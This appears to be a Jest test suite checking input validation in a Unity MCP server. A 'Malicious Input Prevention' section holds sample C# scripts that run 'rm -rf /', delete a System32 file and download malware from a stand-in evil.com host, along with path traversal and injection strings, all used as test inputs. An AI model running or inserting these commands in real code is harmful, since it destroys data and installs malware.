import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { UnityMCPServer } from '../../src/index.js';
import { ConsoleLogger } from '../../src/utils/logger.js';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

describe('Edge Cases: Input Validation', () => {
  let server: any;
  let tempDir: string;
  let projectPath: string;
  let mockLogger: ConsoleLogger;

  beforeEach(async () => {
    // Create temp directory for tests
    tempDir = path.join(os.tmpdir(), `unity-mcp-test-${Date.now()}`);
    fs.mkdirSync(tempDir, { recursive: true });
    
    // Create mock Unity project structure
    projectPath = path.join(tempDir, 'TestProject');
    fs.mkdirSync(path.join(projectPath, 'Assets', 'Scripts'), { recursive: true });
    fs.mkdirSync(path.join(projectPath, 'Assets', 'Materials'), { recursive: true });
    fs.mkdirSync(path.join(projectPath, 'Assets', 'Shaders'), { recursive: true });
    fs.mkdirSync(path.join(projectPath, 'ProjectSettings'), { recursive: true });
    
    // Mock logger
    mockLogger = {
      info: jest.fn(),
      error: jest.fn(),
      warn: jest.fn(),
      debug: jest.fn(),
    } as any;
    
    // Initialize server
    server = new UnityMCPServer(mockLogger);
    
    // Setup project
    await server.services.projectService.setProject(projectPath);
  });

  afterEach(() => {
    // Cleanup
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('Null and Undefined Handling', () => {
    it('should handle null values in required parameters', async () => {
      const testCases = [
        {
          service: 'scriptService',
          method: 'createScript',
          args: [null, 'content', 'folder'],
          error: 'fileName'
        },
        {
          service: 'scriptService',
          method: 'createScript',
          args: ['filename', null, 'folder'],
          error: 'content'
        },
        {
          service: 'materialService',
          method: 'updateMaterialShader',
          args: [null, 'shader'],
          error: 'materialName'
        },
        {
          service: 'shaderService',
          method: 'createShader',
          args: [null, 'builtin'],
          error: 'shaderName'
        },
      ];

      for (const { service, method, args, error } of testCases) {
        try {
          const result = await (server.services as any)[service][method](...args);
          
          // Should not succeed with null required params
          expect(result.content[0].text).toContain('Error');
        } catch (err: any) {
          expect(err.message).toContain(error);
        }
      }
    });

    it('should handle undefined values gracefully', async () => {
      // Test optional parameters with undefined
      const result = await server.services.scriptService.createScript(
        'TestScript',
        'public class TestScript { }',
        undefined // folder is optional
      );

      expect(result.content[0].text).toContain('created successfully');
    });

    it('should handle empty objects and arrays', async () => {
      // Empty properties object
      try {
        const result = await server.services.materialService.updateMaterialProperties(
          'TestMaterial.mat',
          {} // Empty properties
        );
        
        // Should handle empty updates
        expect(result.content[0].text).toBeDefined();
      } catch (error: any) {
        expect(error.message).toContain('properties');
      }

      // Empty array for batch operations
      try {
        const result = await server.services.materialService.batchConvertMaterials(
          [], // Empty materials array
          'Universal Render Pipeline/Lit'
        );
        
        expect(result.content[0].text).toContain('No materials to convert');
      } catch (error: any) {
        expect(error.message).toContain('materials');
      }
    });
  });

  describe('Type Mismatch Handling', () => {
    it('should validate parameter types', async () => {
      const typeMismatchCases = [
        {
          desc: 'number instead of string',
          call: () => server.services.scriptService.createScript(
            123 as any, // Should be string
            'content',
            ''
          ),
          error: 'string'
        },
        {
          desc: 'string instead of boolean',
          call: () => server.services.compilationService.getCompilationErrors(
            'true' as any // Should be boolean
          ),
          error: 'boolean'
        },
        {
          desc: 'object instead of array',
          call: () => server.services.gameSystemService.createPlayerController(
            'platformer',
            { requirement: 'jump' } as any // Should be array
          ),
          error: 'array'
        },
        {
          desc: 'array instead of object',
          call: () => server.services.materialService.updateMaterialProperties(
            'Material.mat',
            ['color', 'texture'] as any // Should be object
          ),
          error: 'object'
        },
      ];

      for (const { desc, call, error } of typeMismatchCases) {
        try {
          await call();
          // Should not succeed with wrong types
          expect(true).toBe(false); // Force failure
        } catch (err: any) {
          expect(err.message.toLowerCase()).toContain(error);
        }
      }
    });

    it('should handle invalid enum values', async () => {
      // Invalid shader type
      try {
        const result = await server.services.shaderService.createShader(
          'TestShader',
          'invalidShaderType' as any,
          undefined
        );
        
        expect(result.content[0].text).toContain('Error');
      } catch (error: any) {
        expect(error.message).toMatch(/shader type|invalid/i);
      }

      // Invalid build target
      try {
        const result = await server.services.buildService.buildProject(
          'InvalidTarget' as any,
          '/output/path'
        );
        
        expect(result.content[0].text).toContain('Error');
      } catch (error: any) {
        expect(error.message).toMatch(/target|platform/i);
      }

      // Invalid editor script type
      try {
        const result = await server.services.editorScriptService.createEditorScript(
          'TestEditor',
          'invalidType' as any,
          {}
        );
        
        expect(result.content[0].text).toContain('Error');
      } catch (error: any) {
        expect(error.message).toMatch(/script type|invalid/i);
      }
    });
  });

  describe('Malicious Input Prevention', () => {
    it('should prevent code injection in script content', async () => {
      const maliciousContents = [
        {
          name: 'System command injection',
          content: `public class Evil { 
            static Evil() { 
              System.Diagnostics.Process.Start("rm", "-rf /"); 
            }
          }`,
        },
        {
          name: 'File system access',
          content: `public class Evil {
            void Start() {
              System.IO.File.Delete(@"C:\\Windows\\System32\\important.dll");
            }
          }`,
        },
        {
          name: 'Network backdoor',
          content: `public class Evil {
            void Start() {
              new System.Net.WebClient().DownloadFile("http://evil.com/malware", "malware.exe");
            }
          }`,
        },
      ];

      for (const { name, content } of maliciousContents) {
        // Should create the script (we don't execute it)
        const result = await server.services.scriptService.createScript(
          `Test${name.replace(/\s+/g, '')}`,
          content,
          ''
        );

        // Script creation should succeed (content validation is Unity's job)
        expect(result.content[0].text).toContain('created successfully');
        
        // But log warnings about suspicious content
        expect(mockLogger.warn).toHaveBeenCalledWith(
          expect.stringContaining('suspicious'),
          expect.anything()
        );
      }
    });

    it('should sanitize material property names', async () => {
      const maliciousProperties = {
        colors: {
          '_BaseColor": "injection': [1, 0, 0, 1], // Quote injection attempt
          '_Color; DROP TABLE': [1, 0, 0, 1], // SQL-like injection
          '../../etc/passwd': [0, 1, 0, 1], // Path traversal
        },
        floats: {
          '_Metallic"; System.exec("evil")': 0.5, // Code injection
          '_Smoothness\x00\x01\x02': 0.8, // Null bytes
        },
      };

      try {
        const result = await server.services.materialService.updateMaterialProperties(
          'TestMaterial.mat',
          maliciousProperties as any
        );

        // Should sanitize or reject malicious property names
        if (result.content[0].text.includes('updated successfully')) {
          // Check that dangerous characters were sanitized
          const matPath = path.join(projectPath, 'Assets', 'Materials', 'TestMaterial.mat');
          const content = fs.readFileSync(matPath, 'utf-8');
          
          expect(content).not.toContain('DROP TABLE');
          expect(content).not.toContain('System.exec');
          expect(content).not.toContain('../');
        }
      } catch (error: any) {
        expect(error.message).toMatch(/invalid|property|name/i);
      }
    });

    it('should prevent directory traversal in asset paths', async () => {
      const traversalAttempts = [
        '../../../sensitive/file.cs',
        '..\\..\\..\\Windows\\System32\\config',
        'Scripts/../../../../../../../etc/passwd',
        'Scripts/./././../../../temp/evil',
        'Scripts/%2e%2e%2f%2e%2e%2f', // URL encoded
      ];

      for (const maliciousPath of traversalAttempts) {
        try {
          const result = await server.services.scriptService.createScript(
            'TestScript',
            'public class TestScript { }',
            maliciousPath
          );

          expect(result.content[0].text).toContain('Error');
        } catch (error: any) {
          expect(error.message).toMatch(/invalid|traversal|outside|path/i);
        }
      }
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should limit array sizes to prevent memory exhaustion', async () => {
      // Attempt to create thousands of materials at once
      const hugeMaterialList = Array(10000).fill('Material');
      
      try {
        const result = await server.services.materialService.batchConvertMaterials(
          hugeMaterialList,
          'Universal Render Pipeline/Lit'
        );

        // Should either limit batch size or reject
        if (result.content[0].text.includes('Error')) {
          expect(result.content[0].text).toMatch(/too many|limit|batch/i);
        } else {
          // Check if it processed a limited number
          const processed = result.content[0].text.match(/\d+/);
          if (processed) {
            expect(parseInt(processed[0])).toBeLessThan(1000); // Reasonable limit
          }
        }
      } catch (error: any) {
        expect(error.message).toMatch(/limit|memory|too many/i);
      }
    });

    it('should prevent infinite loops in recursive operations', async () => {
      // Create deeply nested folder structure attempt
      let deepPath = '';
      for (let i = 0; i < 1000; i++) {
        deepPath += `Level${i}/`;
      }

      try {
        const result = await server.services.scriptService.createScript(
          'DeepScript',
          'public class DeepScript { }',
          deepPath
        );

        // Should reject extremely deep paths
        expect(result.content[0].text).toContain('Error');
      } catch (error: any) {
        expect(error.message).toMatch(/deep|limit|path/i);
      }
    });

    it('should handle extremely long strings', async () => {
      const extremelyLongName = 'A'.repeat(10000);
      
      try {
        const result = await server.services.scriptService.createScript(
          extremelyLongName,
          'public class Test { }',
          ''
        );

        // Should either truncate or reject
        if (result.content[0].text.includes('created successfully')) {
          // Check actual filename was truncated
          const scriptsPath = path.join(projectPath, 'Assets', 'Scripts');
          const files = fs.readdirSync(scriptsPath);
          const createdFile = files.find(f => f.startsWith('A') && f.endsWith('.cs'));
          
          if (createdFile) {
            expect(createdFile.length).toBeLessThan(260); // Max path length
          }
        } else {
          expect(result.content[0].text).toContain('Error');
        }
      } catch (error: any) {
        expect(error.message).toMatch(/long|length|limit/i);
      }
    });
  });

  describe('Special Characters and Encoding', () => {
    it('should handle various Unicode characters', async () => {
      const unicodeTests = [
        { name: 'Emoji', content: '🚀🔥💻🎮' },
        { name: 'CJK', content: '日本語中文한국어' },
        { name: 'RTL', content: 'العربية עברית' },
        { name: 'Combining', content: 'é (e\u0301) ñ (n\u0303)' },
        { name: 'ZeroWidth', content: 'Zero\u200BWidt\u200Ch' },
        { name: 'Control', content: 'Control\x01\x02\x03Chars' },
      ];

      for (const { name, content } of unicodeTests) {
        const scriptContent = `public class ${name}Test {
          public string text = "${content}";
        }`;

        try {
          const result = await server.services.scriptService.createScript(
            `${name}Test`,
            scriptContent,
            ''
          );

          if (result.content[0].text.includes('created successfully')) {
            // Verify content is preserved
            const readResult = await server.services.scriptService.readScript(`${name}Test.cs`);
            expect(readResult.content[0].text).toContain(content);
          }
        } catch (error: any) {
          // Some characters might be rejected
          expect(error.message).toMatch(/character|encoding|invalid/i);
        }
      }
    });

    it('should handle different text encodings', async () => {
      // Create files with different encodings
      const encodings = [
        { name: 'UTF8', bom: Buffer.from([0xEF, 0xBB, 0xBF]) },
        { name: 'UTF16LE', bom: Buffer.from([0xFF, 0xFE]) },
        { name: 'UTF16BE', bom: Buffer.from([0xFE, 0xFF]) },
      ];

      for (const { name, bom } of encodings) {
        const scriptPath = path.join(projectPath, 'Assets', 'Scripts', `${name}Script.cs`);
        const content = Buffer.concat([
          bom,
          Buffer.from('public class Test { }', 'utf8')
        ]);

        fs.writeFileSync(scriptPath, content);
        fs.writeFileSync(scriptPath + '.meta', 'fileFormatVersion: 2\nguid: test123\n');

        try {
          const result = await server.services.scriptService.readScript(`${name}Script.cs`);
          
          // Should handle different encodings
          expect(result.content[0].text).toContain('class Test');
        } catch (error: any) {
          expect(error.message).toMatch(/encoding|read/i);
        }
      }
    });
  });

  describe('Concurrent Access Validation', () => {
    it('should handle race conditions in project setup', async () => {
      const promises = [];
      
      // Multiple concurrent project setups
      for (let i = 0; i < 10; i++) {
        promises.push(
          server.services.projectService.setProject(projectPath)
            .catch((err: any) => ({ error: err }))
        );
      }

      const results = await Promise.all(promises);
      
      // All should succeed or fail gracefully
      const successes = results.filter(r => !r.error);
      const errors = results.filter(r => r.error);
      
      expect(successes.length + errors.length).toBe(10);
      
      // No crashes or undefined behavior
      errors.forEach(({ error }) => {
        expect(error.message).toBeDefined();
      });
    });

    it('should validate state consistency', async () => {
      // Create initial state
      await server.services.scriptService.createScript(
        'StateTest',
        'public class StateTest { public int version = 1; }',
        ''
      );

      // Concurrent updates
      const updates = [];
      for (let i = 2; i <= 10; i++) {
        updates.push(
          server.services.scriptService.updateScript(
            'StateTest.cs',
            `public class StateTest { public int version = ${i}; }`
          ).catch(err => ({ error: err, version: i }))
        );
      }

      await Promise.all(updates);

      // Read final state
      const finalResult = await server.services.scriptService.readScript('StateTest.cs');
      const versionMatch = finalResult.content[0].text.match(/version = (\d+)/);
      
      // Should have a valid final state
      expect(versionMatch).toBeTruthy();
      expect(parseInt(versionMatch![1])).toBeGreaterThanOrEqual(1);
      expect(parseInt(versionMatch![1])).toBeLessThanOrEqual(10);
    });
  });

  describe('Boundary Value Testing', () => {
    it('should handle minimum and maximum values', async () => {
      // Color values (0-1 range)
      const colorTests = [
        { name: 'Min', values: [0, 0, 0, 0] },
        { name: 'Max', values: [1, 1, 1, 1] },
        { name: 'Negative', values: [-1, -0.5, -0.1, 0] },
        { name: 'OverOne', values: [2, 1.5, 1.1, 1] },
        { name: 'Infinity', values: [Infinity, -Infinity, NaN, 1] },
      ];

      for (const { name, values } of colorTests) {
        try {
          const result = await server.services.materialService.updateMaterialProperties(
            'BoundaryTest.mat',
            {
              colors: {
                '_BaseColor': values
              }
            }
          );

          // Should clamp or validate values
          if (name === 'Infinity') {
            expect(result.content[0].text).toContain('Error');
          }
        } catch (error: any) {
          if (name === 'Infinity') {
            expect(error.message).toMatch(/invalid|value|number/i);
          }
        }
      }
    });

    it('should handle empty strings vs whitespace', async () => {
      const stringTests = [
        { name: 'Empty', value: '' },
        { name: 'Space', value: ' ' },
        { name: 'Tab', value: '\t' },
        { name: 'Newline', value: '\n' },
        { name: 'Mixed', value: '  \t\n  ' },
      ];

      for (const { name, value } of stringTests) {
        try {
          const result = await server.services.scriptService.createScript(
            value || 'EmptyName', // Fallback for empty string
            'public class Test { }',
            ''
          );

          if (value === '') {
            expect(result.content[0].text).toContain('Error');
          } else {
            // Should handle or sanitize whitespace names
            expect(result.content[0].text).toBeDefined();
          }
        } catch (error: any) {
          expect(error.message).toMatch(/name|empty|invalid/i);
        }
      }
    });
  });
});